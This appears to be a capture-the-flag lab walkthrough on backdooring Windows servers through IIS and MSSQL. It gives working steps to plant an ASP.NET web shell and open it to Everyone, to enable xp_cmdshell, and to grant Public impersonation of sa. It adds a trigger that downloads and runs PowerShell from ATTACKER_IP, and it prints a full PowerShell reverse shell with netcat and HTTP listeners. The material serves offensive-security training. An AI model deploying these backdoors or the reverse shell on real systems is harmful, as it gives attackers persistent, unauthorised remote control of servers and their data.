# Persisting Through Existing Services

If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control over what gets executed should be backdoorable similarly. The possibilities are endless!

---

## Using Web Shells

The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the **Windows Privesc Room**.

### Steps:

1. **Download an ASP.NET web shell**:  
    A ready-to-use web shell is provided [here](#), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:

    ```cmd
    C:\> move shell.aspx C:\inetpub\wwwroot\
    ```

    **Note**: Depending on the way you create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a "Permission Denied" error while accessing the shell's URL, just grant everyone full permissions on the file to get it working:

    ```cmd
    icacls shell.aspx /grant Everyone:F
    ```

2. **Access the web shell**:  
    You can then run commands from the web server by pointing to the following URL:

    ```
    http://MACHINE_IP/shell.aspx
    ```

    ![web shell](#)

3. **THM Flag**:  
    Use your web shell to execute the following command to retrieve the flag:

    ```cmd
    C:\flags\flag16.exe
    ```

**Note**: While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.

---

## Using MSSQL as a Backdoor

There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses **triggers**. Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in to data being inserted, updated, or deleted from a given table. For this task, we will create a trigger for any `INSERT` into the `HRDB` database.

### Steps:

1. **Enable `xp_cmdshell`**:  
    `xp_cmdshell` is a stored procedure that allows you to run commands directly in the system's console but comes disabled by default. To enable it:

    - Open **Microsoft SQL Server Management Studio 18** (available from the Start menu).
    - Use **Windows Authentication** to log in.
    - Click on the **New Query** button to open the query editor.
    - Run the following SQL commands:

      ```sql
      sp_configure 'Show Advanced Options', 1;
      RECONFIGURE;
      GO

      sp_configure 'xp_cmdshell', 1;
      RECONFIGURE;
      GO
      ```

2. **Grant privileges**:  
    Ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role can do so. Grant privileges to all users to impersonate the `sa` user (default database administrator):

    ```sql
    USE master;
    GRANT IMPERSONATE ON LOGIN::sa TO [Public];
    ```

3. **Create a trigger**:  
    Change to the `HRDB` database and configure a trigger to execute whenever an `INSERT` is made into the `Employees` table. The trigger will leverage `xp_cmdshell` to execute PowerShell to download and run a `.ps1` file from a web server controlled by the attacker:

    ```sql
    USE HRDB;

    CREATE TRIGGER [sql_backdoor]
    ON HRDB.dbo.Employees 
    FOR INSERT AS

    EXECUTE AS LOGIN = 'sa';
    EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
    ```

4. **Create `evilscript.ps1`**:  
    On the attacker's machine, create a PowerShell reverse shell script (`evilscript.ps1`):

    ```powershell
    $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4454);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535 | %{0};
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
         $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
         $sendback = (iex $data 2>&1 | Out-String);
         $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
         $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
         $stream.Write($sendbyte, 0, $sendbyte.Length);
         $stream.Flush();
    }
    $client.Close();
    ```

5. **Set up listeners**:  
    Open two terminals to handle the connections involved in this exploit:

    - **Terminal 1**: Serve the `evilscript.ps1` file:

      ```bash
      user@AttackBox$ python3 -m http.server
      ```

    - **Terminal 2**: Listen for the reverse shell:

      ```bash
      user@AttackBox$ nc -lvp 4454
      ```

6. **Trigger the backdoor**:  
    Navigate to `http://MACHINE_IP/` and insert an employee into the web application. Since the web application will send an `INSERT` statement to the database, the trigger will provide access to the system's console.

7. **THM Flag**:  
    Use your web shell to execute the following command to retrieve the flag:

    ```cmd
    C:\flags\flag17.exe
    ```